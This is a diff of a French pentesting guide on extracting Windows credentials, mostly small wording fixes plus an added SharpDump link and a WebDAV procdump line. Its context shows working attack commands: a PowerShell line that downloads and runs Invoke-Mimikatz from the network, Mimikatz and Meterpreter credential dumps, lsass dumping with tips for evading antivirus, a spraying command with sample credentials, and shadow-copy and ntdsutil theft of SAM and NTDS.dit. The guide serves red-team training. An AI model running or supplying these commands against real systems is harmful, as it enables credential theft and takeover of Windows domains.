@@ -24,11 +24,11 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
-[**Découvrez quelques protections possibles des identifiants ici.**](credentials-protections.md) **Ces protections pourraient empêcher Mimikatz d'extraire certains identifiants.**
+[**Découvrez ici quelques protections possibles des identifiants.**](credentials-protections.md) **Ces protections pourraient empêcher Mimikatz d'extraire certains identifiants.**
 
 ## Identifiants avec Meterpreter
 
-Utilisez le [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que j'ai créé pour** **rechercher des mots de passe et des hachages** à l'intérieur de la victime.
+Utilisez le [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** j'ai créé pour **rechercher des mots de passe et des hachages** à l'intérieur de la victime.
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -51,12 +51,16 @@ mimikatz_command -f "lsadump::sam"
 
 Comme **Procdump de** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**est un outil légitime de Microsoft**, il n'est pas détecté par Defender.\
 Vous pouvez utiliser cet outil pour **extraire le processus lsass**, **télécharger le dump** et **extraire** les **identifiants localement** à partir du dump.
+
+Vous pouvez également utiliser [SharpDump](https://github.com/GhostPack/SharpDump).
 ```bash:Dump lsass
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 #Remote, mount https://live.sysinternals.com which contains procdump.exe
 net use Z: https://live.sysinternals.com
 Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+# Get it from webdav
+\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 
 ```c:Extract credentials from the dump
@@ -67,7 +71,7 @@ mimikatz # sekurlsa::logonPasswords
 ```
 Ce processus est effectué automatiquement avec [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Remarque**: Certains **AV** peuvent **détecter** comme **malveillant** l'utilisation de **procdump.exe pour dumper lsass.exe**, cela est dû au fait qu'ils **détectent** la chaîne **"procdump.exe" et "lsass.exe"**. Il est donc **plus discret** de **passer** en tant qu'**argument** le **PID** de lsass.exe à procdump **au lieu de** le **nom lsass.exe.**
+**Remarque**: Certains **AV** peuvent **détecter** comme **malveillant** l'utilisation de **procdump.exe pour dumper lsass.exe**, cela est dû au fait qu'ils **détectent** la chaîne **"procdump.exe" et "lsass.exe"**. Il est donc **plus furtif** de **passer** comme **argument** le **PID** de lsass.exe à procdump **au lieu de** le **nom lsass.exe.**
 
 ### Dumper lsass avec **comsvcs.dll**
 
@@ -154,7 +158,7 @@ Vous pouvez effectuer une copie de fichiers protégés en utilisant ce service. 
 
 #### Using vssadmin
 
-Le binaire vssadmin est uniquement disponible dans les versions Windows Server.
+vssadmin binaire est uniquement disponible dans les versions Windows Server
 ```bash
 vssadmin create shadow /for=C:
 #Copy SAM
@@ -212,7 +216,7 @@ Disponible depuis Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-Vous pouvez également utiliser le [**volume shadow copy**](#stealing-sam-and-system) pour copier le fichier **ntds.dit**. N'oubliez pas que vous aurez également besoin d'une copie du **fichier SYSTEM** (encore une fois, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick).
+Vous pouvez également utiliser le [**volume shadow copy**](#stealing-sam-and-system) pour copier le fichier **ntds.dit**. N'oubliez pas que vous aurez également besoin d'une copie du fichier **SYSTEM** (encore une fois, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system)).
 
 ### **Extraction des hashes depuis NTDS.dit**
 
@@ -234,7 +238,7 @@ Les objets NTDS peuvent être extraits vers une base de données SQLite avec [nt
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-Le `SYSTEM` hive est optionnel mais permet le déchiffrement des secrets (NT & LM hashes, informations d'identification supplémentaires telles que les mots de passe en clair, clés kerberos ou de confiance, historiques de mots de passe NT & LM). Avec d'autres informations, les données suivantes sont extraites : comptes utilisateurs et machines avec leurs hashes, drapeaux UAC, horodatage pour la dernière connexion et le changement de mot de passe, description des comptes, noms, UPN, SPN, groupes et adhésions récursives, arbre des unités organisationnelles et adhésion, domaines de confiance avec type de confiance, direction et attributs...
+Le `SYSTEM` hive est optionnel mais permet le déchiffrement des secrets (hashes NT & LM, informations d'identification supplémentaires telles que les mots de passe en clair, clés kerberos ou de confiance, historiques de mots de passe NT & LM). Avec d'autres informations, les données suivantes sont extraites : comptes utilisateurs et machines avec leurs hashes, drapeaux UAC, horodatage pour la dernière connexion et le changement de mot de passe, description des comptes, noms, UPN, SPN, groupes et adhésions récursives, arbre des unités organisationnelles et adhésion, domaines de confiance avec type de confiance, direction et attributs...
 
 ## Lazagne
 
